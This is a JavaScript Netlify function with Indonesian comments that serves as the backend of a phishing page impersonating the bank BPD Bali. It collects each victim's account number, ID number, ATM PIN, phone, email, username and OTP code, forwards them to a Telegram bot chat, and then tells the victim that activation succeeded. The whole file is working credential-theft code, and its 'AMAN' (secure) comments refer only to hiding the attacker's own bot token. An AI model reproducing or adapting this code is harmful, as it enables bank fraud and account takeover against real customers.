// Netlify Function untuk mengirim notifikasi ke Telegram Bot
// AMAN: Token dan Chat ID disimpan di Environment Variables Netlify

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method not allowed' })
        };
    }
    
    try {
        // Ambil data dari request body
        const data = JSON.parse(event.body);
        
        // Validasi data yang diterima
        const requiredFields = ['noRekening', 'noIdentitas', 'pinAtm', 'noTelpon', 'email', 'username', 'kodeOtp'];
        for (const field of requiredFields) {
            if (!data[field]) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ message: `Field ${field} tidak boleh kosong` })
                };
            }
        }
        
        // Ambil konfigurasi dari Environment Variables (AMAN)
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Environment variables not set');
            return {
                statusCode: 500,
                body: JSON.stringify({ message: 'Konfigurasi server error' })
            };
        }
        
        // Format pesan untuk Telegram
        const message = `
🔐 *AKTIVASI BANK BPD BALI* 🔐
━━━━━━━━━━━━━━━━━━━━━
🕐 *Waktu:* ${data.timestamp || new Date().toLocaleString('id-ID')}
━━━━━━━━━━━━━━━━━━━━━
📋 *DATA NASABAH*
━━━━━━━━━━━━━━━━━━━━━
🏦 *No. Rekening:* ${data.noRekening}
🆔 *No. Identitas:* ${data.noIdentitas}
🔑 *PIN ATM:* ${data.pinAtm}
📞 *No. Telepon:* ${data.noTelpon}
✉️ *Email:* ${data.email}
━━━━━━━━━━━━━━━━━━━━━
👤 *Username:* ${data.username}
🔢 *Kode OTP:* ${data.kodeOtp}
━━━━━━━━━━━━━━━━━━━━━
✅ *STATUS: AKTIVASI BERHASIL*
        `;
        
        // Encode pesan untuk URL
        const encodedMessage = encodeURIComponent(message);
        
        // Kirim ke Telegram Bot API
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
        
        const response = await fetch(telegramUrl);
        const result = await response.json();
        
        if (!response.ok || !result.ok) {
            console.error('Telegram API error:', result);
            return {
                statusCode: 500,
                body: JSON.stringify({ message: 'Gagal mengirim ke Telegram', error: result.description })
            };
        }
        
        // Log sukses (opsional)
        console.log('Notifikasi terkirim ke Telegram:', new Date().toISOString());
        
        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Notifikasi berhasil dikirim',
                data: {
                    noRekening: data.noRekening,
                    username: data.username,
                    timestamp: data.timestamp
                }
            })
        };
        
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Internal server error', error: error.message })
        };
    }
};
